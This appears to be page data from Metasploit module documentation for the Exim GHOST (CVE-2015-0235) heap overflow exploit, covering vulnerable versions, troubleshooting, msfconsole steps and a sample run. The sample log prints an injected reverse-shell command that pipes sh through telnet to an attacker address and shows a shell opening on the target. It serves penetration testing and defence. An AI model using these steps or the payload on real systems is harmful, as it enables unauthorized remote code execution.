{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/smtp/exim_gethostbyname_bof","result":{"data":{"moduleMetadataJson":{"id":"10bb040c-791a-5458-aafb-9011c5a67e3b","name":"Exim GHOST (glibc gethostbyname) Buffer Overflow","fullname":"exploit/linux/smtp/exim_gethostbyname_bof","description":"This module remotely exploits CVE-2015-0235, aka GHOST, a heap-based\n        buffer overflow in the GNU C Library's gethostbyname functions on x86\n        and x86_64 GNU/Linux systems that run the Exim mail server.","rank":500,"fields":{"detailsSlug":"/modules/details/exploit/linux/smtp/exim_gethostbyname_bof","documentationSlug":"/modules/documentation/exploit/linux/smtp/exim_gethostbyname_bof","referencesSlug":"/modules/references/exploit/linux/smtp/exim_gethostbyname_bof"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>The Exim GHOST buffer overflow is a vulnerability found by researchers from Qualys.\nOn March 17th 2015, Qualys released an exploit module demonstrating the exploitability\nof this flaw, which is now <code class=\"language-text\">exim_gethostbyname_bof</code> in Metasploit Framework.</p>\n<p>When Qualys released the exploit, it included a lot of technical details for debugging\nand usage purposes. We decided to put all that here in a more readable format.</p>\n<h3 id=\"what-is-ghost\" style=\"position:relative;\"><a href=\"#what-is-ghost\" aria-label=\"what is ghost permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>What is \"GHOST\"</h3>\n<p>This is a heap based buffer overflow found in GNU C Library's <strong>g</strong>et<strong>host</strong>byname\nfunctions since glibc-2.2 (November 10, 2000), which is part of the Linux operating\nsystem, such as: Debian, Red Hat, CentOS, and Ubuntu.</p>\n<h3 id=\"exploitable-requirements\" style=\"position:relative;\"><a href=\"#exploitable-requirements\" aria-label=\"exploitable requirements permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Exploitable Requirements</h3>\n<p><strong>On the server-side (victim):</strong></p>\n<ul>\n<li>glibc-2.6 - glibc-2.17: The exploit depends on the newer versions' <code class=\"language-text\">fd_nextsize</code>\n(a member of the malloc<em>chunk structure) to remotely obtain the address of Exim's\n`smtp</em>cmd_buffer` in the heap.</li>\n<li>Exim server. The first exploitable version is Exim-4.77, maybe older. The exploit\ndepends on the newer versions' 16-KB <code class=\"language-text\">smtp_cmd_buffer</code> to reliably set up the heap as described in the advisory.</li>\n<li>The Exim server also must enable <code class=\"language-text\">helo_try_verify_hosts</code> or <code class=\"language-text\">helo_verify_hosts</code>\nin the <code class=\"language-text\">/etc/exim4/exim4.conf.template</code> file. The <code class=\"language-text\">verify = helo</code> ACL might be exploitable\ntoo, but the attack vector isn't as reliable, therefore not supported by the module.</li>\n</ul>\n<p>For testing purposes, if you need to find a vulnerable system, you can try Debian 7\n(it should come with an exploitable Exim server):\n<a href=\"https://archive.org/download/Debian-7.7.0/debian-7.7.0-i386-DVD-1.iso\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">debian-7.7.0-i386-DVD-1.iso</a></p>\n<p><strong>On the attacker's side:</strong></p>\n<ul>\n<li>The attacker's IPv4 address must have both forward and reverse DNS entries that match each other\n(Forward-Confirmed reverse DNS).</li>\n</ul>\n<h3 id=\"troubleshooting\" style=\"position:relative;\"><a href=\"#troubleshooting\" aria-label=\"troubleshooting permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Troubleshooting</h3>\n<p>If the <code class=\"language-text\">exim_gethostbyname_bof.rb</code> module has failed on you:</p>\n<table>\n<thead>\n<tr>\n<th>Failure</th>\n<th>Explanation</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>bad <code class=\"language-text\">SENDER_HOST_ADDRESS</code> (nil)</td>\n<td>The <code class=\"language-text\">SENDER_HOST_ADDRESS</code> datastore option was not specified</td>\n</tr>\n<tr>\n<td>bad <code class=\"language-text\">SENDER_HOST_ADDRESS</code> (not in IPv4 dotted-decimal notation)</td>\n<td>The <code class=\"language-text\">SENDER_HOST_ADDRESS</code> datastore option was specified, but not in IPv4 dotted-decimal notation</td>\n</tr>\n<tr>\n<td>bad <code class=\"language-text\">SENDER_HOST_ADDRESS</code> (helo<em>verify</em>hosts)</td>\n<td>The <code class=\"language-text\">SENDER_HOST_ADDRESS</code> datastore option does not match the IPv4 address of the SMTP client (Metasploit), as seen by the SMTP server (Exim).</td>\n</tr>\n<tr>\n<td>bad <code class=\"language-text\">SENDER_HOST_ADDRESS</code> (no FCrDNS)</td>\n<td>the IPv4 address of the SMTP client (Metasploit) has no Forward-Confirmed reverse DNS.</td>\n</tr>\n<tr>\n<td>not vuln? old glibc? (no leaked_arch)</td>\n<td>the remote Exim server is either not vulnerable, or not exploitable (glibc versions older than glibc-2.6 have no fd<em>nextsize member in their malloc</em>chunk structure).</td>\n</tr>\n<tr>\n<td>NUL, CR, LF in addr? (no leaked_addr)</td>\n<td>Exim's heap address contains bad characters (NUL, CR, LF) and was therefore mangled during the information leak; this exploit is able to reconstruct most of these addresses, but not all (worst-case probability is ~1/85, but could be further improved).</td>\n</tr>\n<tr>\n<td>Brute-force SUCCESS followed by a nil reply, but no shell</td>\n<td>the remote Unix command was executed, but spawned a bind-shell or a reverse-shell that failed to connect (maybe because of a firewall, or a NAT, etc).</td>\n</tr>\n<tr>\n<td>Brute-force SUCCESS followed by a non-nil reply, and no shell</td>\n<td>The remote Unix command was executed, but failed to spawn the shell (maybe because the setsid command doesn't exist, or awk isn't gawk, or netcat doesn't support the -6 or -e option, or telnet doesn't support the -z option, etc).</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Install the application</li>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use exploit/linux/smtp/exim_gethostbyname_bof</code></li>\n<li>Do: <code class=\"language-text\">set rhosts [ip]</code></li>\n<li>Do: <code class=\"language-text\">set SENDER_HOST_ADDRESS [ip]</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n<li>You should get a shell.</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<h3 id=\"senderhostaddress\" style=\"position:relative;\"><a href=\"#senderhostaddress\" aria-label=\"senderhostaddress permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SENDER<em>HOST</em>ADDRESS</h3>\n<p>The IPv4 address of the SMTP client (Metasploit), as seen by the SMTP server (Exim)</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"debian-77\" style=\"position:relative;\"><a href=\"#debian-77\" aria-label=\"debian 77 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Debian 7.7</h3>\n<p>When everything is dialed in correctly, a successful attack should look like the following:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(exim_gethostbyname_bof) &gt; run\n\n[*] Started reverse double handler\n[*] Trying information leak...\n[!] {:heap_shift=&gt;736}\n[!] {:write_offset=&gt;128, :error=&gt;&quot;503 sender not yet given&quot;}\n[!] {:write_offset=&gt;136, :error=&gt;&quot;\\xE0.\\xFF\\xB7\\xE0.\\xFF\\xB7er not yet given&quot;}\n[!] {:error=&gt;[&quot;\\xE0.\\xFF\\xB7\\xE0.\\xFF\\xB7er not yet given&quot;, &quot;&quot;, &quot;503 \\x89\\x10&quot;, &quot;177&quot;, &quot;177\\\\177\\\\177&quot;, &quot;vJN\\\\177\\\\177\\\\177\\\\177&quot;]}\n[!] {:leaked_arch=&gt;&quot;x86&quot;}\n[!] {:count=&gt;{&quot;\\xE0.\\xFF\\xB7\\xE0.\\xFF\\xB7er not yet given&quot;=&gt;8, &quot;hF\\xFE\\xB7hF\\xFE\\xB7er not yet given&quot;=&gt;2}}\n[+] Successfully leaked_arch: x86\n[+] Successfully leaked_addr: b7fda760\n[*] Trying code execution...\n[!] ${run{/usr/bin/env setsid /bin/sh -c &quot;sh -c &#39;(sleep 4011|telnet 192.168.1.64 4444|while : ; do sh &amp;&amp; break; done 2&gt;&amp;1|telnet 192.168.1.64 4444 &gt;/dev/null 2&gt;&amp;1 &amp;)&#39;&quot;}}\n[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;&quot;b7fda760&quot;, :offset=&gt;21}\n[!] {:reply=&gt;{:code=&gt;&quot;250&quot;, :lines=&gt;[&quot;250 Accepted\\r\\n&quot;]}}\n[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;&quot;b7fda760&quot;, :offset=&gt;25}\n[!] {:reply=&gt;{:code=&gt;&quot;250&quot;, :lines=&gt;[&quot;250 Accepted\\r\\n&quot;]}}\n[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;&quot;b7fd8fd7&quot;, :offset=&gt;20}\n[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;&quot;b7fd8fd7&quot;, :offset=&gt;8}\n[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;&quot;b7fd784e&quot;, :offset=&gt;6}\n[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;&quot;b7fd784e&quot;, :offset=&gt;12}\n[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;&quot;b7fd60c5&quot;, :offset=&gt;19}\n[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;&quot;b7fd60c5&quot;, :offset=&gt;29}\n[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;&quot;b7fd493c&quot;, :offset=&gt;23}\n[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;&quot;b7fd493c&quot;, :offset=&gt;18}\n[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;&quot;b7fd31b3&quot;, :offset=&gt;14}\n[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;&quot;b7fd31b3&quot;, :offset=&gt;3}\n[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;&quot;b7fd1a2a&quot;, :offset=&gt;29}\n[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;&quot;b7fd1a2a&quot;, :offset=&gt;28}\n[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;&quot;b7fd02a1&quot;, :offset=&gt;26}\n[!] {:reply=&gt;{:code=&gt;&quot;550&quot;, :lines=&gt;[&quot;550 sikVtqGxFOjCBOWTbDupmIuJRmLmShFNqqUYRRPUolyxPmmgLCenEzConuVGWafjgycyRfXulGNwmAOvkqZkGobMyUIMPojZsaziCjVVyvabOrcieEWrLZSgnCCXHeXjIzGGfUALAIubgBEmsKsSWSGa\\r\\n&quot;]}}\n[+] Brute-force SUCCESS\n[+] Please wait for reply...\n[*] Accepted the first client connection...\n[*] Accepted the second client connection...\n[*] Command: echo qaNpBmRBEus9XoVZ;\n[*] Writing to socket A\n[*] Writing to socket B\n[*] Reading from sockets...\n[*] Reading from socket A\n[*] A: &quot;qaNpBmRBEus9XoVZ\\r\\n&quot;\n[*] Matching...\n[*] B is input...\n[*] Command shell session 1 opened (192.168.1.64:4444 -&gt; 192.168.1.166:58859) at 2015-03-19 03:36:52 -0500\n[!] {:reply=&gt;nil}\n\nid\nuid=104(Debian-exim) gid=112(Debian-exim) groups=112(Debian-exim)</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"10bb040c-791a-5458-aafb-9011c5a67e3b"}}}